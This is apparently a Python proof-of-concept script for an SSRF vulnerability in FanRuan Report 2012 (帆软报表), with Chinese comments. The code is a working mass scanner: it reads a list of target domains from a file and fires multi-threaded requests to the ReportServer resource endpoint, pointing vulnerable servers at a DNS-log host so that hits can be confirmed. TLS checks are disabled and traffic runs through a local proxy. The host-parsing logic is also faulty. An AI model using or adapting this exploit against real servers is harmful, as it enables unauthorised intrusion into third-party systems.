# 帆软报表 2012 SSRF漏洞
# 作者 charis

import requests
from requests.packages import urllib3
urllib3.disable_warnings()
from threading import Thread, enumerate
from time import sleep

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0"
}

proxies = {
    "http": "http://127.0.0.1:10811",
    "https": "https://127.0.0.1:10811",
}

def postData(url, headers, proxies):
    try:
        s = ""
        if url[0:7] == "http://":
            log = url.replace("http://", "")
        if url[0:8] == "https://":
            log = url.replace("https://", "")
        else:
            log = ""
        poc = f"/ReportServer?op=resource&resource="+log+"charis3389.xyz"
        urldata = url.strip("\n") + poc
        requests.packages.urllib3.disable_warnings()
        re = requests.get(urldata, headers=headers, proxies=proxies, verify=False)
        print("[+] 发送数据成功，到dnslog查看！")
    except requests.exceptions.ConnectionError:
        pass

with open("D:\\code\\python\\exp\\帆软报表2012\\domain.txt", encoding="utf-8") as f:
    for i in f.readlines():
        if len(enumerate()) < 100:
            Thread(target=postData, args=(i, headers, proxies)).start()
        else:
            sleep(1)